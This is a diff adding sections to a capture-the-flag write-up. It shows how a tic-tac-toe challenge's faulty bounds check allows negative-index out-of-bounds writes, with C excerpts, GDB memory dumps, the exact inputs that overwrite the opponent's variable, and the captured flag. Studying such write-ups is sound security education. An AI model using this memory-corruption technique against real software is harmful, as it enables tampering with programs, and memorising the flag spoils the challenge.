@@ -109,21 +109,114 @@ Even being so simple, this algorithm is quite literally **mathematically impossi
 
 # Out of bounds?
 
+Ok, so we can't beat this. Maybe the source code has something, maybe its an traditional pwn challenge rather than some odd math problem for the steps.<br>
+When I played around with this, I entered the number 11 by accident and somehow it worked.
+
+```
+You want the flag? You'll have to beat me first!
+   |   |
+---|---|---
+   |   |
+---|---|---
+   |   |
+
+Enter row #(1-3): 11
+Enter column #(1-3): 1
+
+ O |   |
+---|---|---
+   |   |
+---|---|---
+   |   |
+
+```
+You can't actually see it, but it must have overwritten something.
+
+Cutting to the important lines. I looks like they do have a bounds check but its bad, it doesn't let us write over the computer's tiles and most importantly, it never enforces the bounds at all for **us**.
+
+```c 
+if(index >= 0 && index < 9 && board[index] != ' '){
+   printf("Invalid move.\n");
+}else{
+   board[index] = player; // Should be safe, given that the user cannot overwrite tiles on the board <-- comment by chall maker
+   break;
+}
+```
+
+It never was safe. Its right that we can't steal claimed tiles, yet we have a **out-of-bounds memory write!!!** because the board list declared above is of size 9.
 
 
 # Lets pull out GDB
 
+Reminder of the order of how its declared, we can assume that the board will be close to the memory addresses of the player and computer variable.
+```c
+char board[9];
+char player = 'X';
+char computer = 'O';
+```
+Indeed, GDB confirms this:
+
+```bash
+0x555555558050 <player>:        88 'X'  79 'O'  0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'
+0x555555558058 <stdout@GLIBC_2.2.5>:    -64 '\300'      -43 '\325'      -33 '\337'      -9 '\367'       -1 '\377'       127 '\177'      0 '\000'        0 '\000'
+0x555555558060 <completed.0>:   0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'
+0x555555558068 <board>: 79 'O'  32 ' '  32 ' '  32 ' '  32 ' '  32 ' '  32 ' '  32 ' '
+0x555555558070 <board+8>:       32 ' '  0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'
+```
+There they are, both the player and computer variables at `88 'X'  79 'O'`, below them is standard GLIB stuff we can choose to ignore, and further from that is our board.
 
 # Game Plan
 
+If we can overwrite the computer's variable with an 'X', the computer will playing for us, letting us win easily.
+This can be confirmed because the checkWin function, even if it looks complex, just does multiple string comparisons, nothing more.
+```c
+int checkWin() {
+   for (int i = 0; i < 3; i++) {
+      if (board[3*i] == board[3*i+1] && board[3*i] == board[3*i+2] && board[3*i] != ' ')
+         return board[3*i]; 
+   }
+   for (int i = 0; i < 3; i++) {
+      if (board[i] == board[3+i] && board[i] == board[6+i] && board[i] != ' ')
+         return board[i];
+   }
+   if (board[0] == board[4] && board[0] == board[8] && board[0] != ' ')
+      return board[0];
+   if (board[2] == board[4] && board[2] == board[6] && board[2] != ' ')
+      return board[2];
 
-# Trial and Error
+   return ' ';
+}
+```
 
-
-# The computer playing for us 
-
+Since we want to move back in memory, we need to enter negative values, which the bounds check doesn't care about. After some trial and error, we gradually move back until we hit the computer's variable.
 
 # Win!
+```
+Enter row #(1-3): -4
+Enter column #(1-3): -7
+
+   |   |
+---|---|---
+   | X |
+---|---|---
+   |   |
+
+Enter row #(1-3): 1
+Enter column #(1-3): 1
+
+ X |   |
+---|---|---
+   | X |
+---|---|---
+   |   | X
+```
+At row -4 and column -7, we successfully corrupt the computer's variable, making it play for us.
+<br> GDB:
+```bash
+0x555555558050 <player>:        88 'X'  88 'X'  0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'
+```
+And we got it, `How's this possible? Well, I guess I'll have to give you the flag now.`!
+`lactf{th3_0nly_w1nn1ng_m0ve_1s_t0_p1ay}`
 
 
 
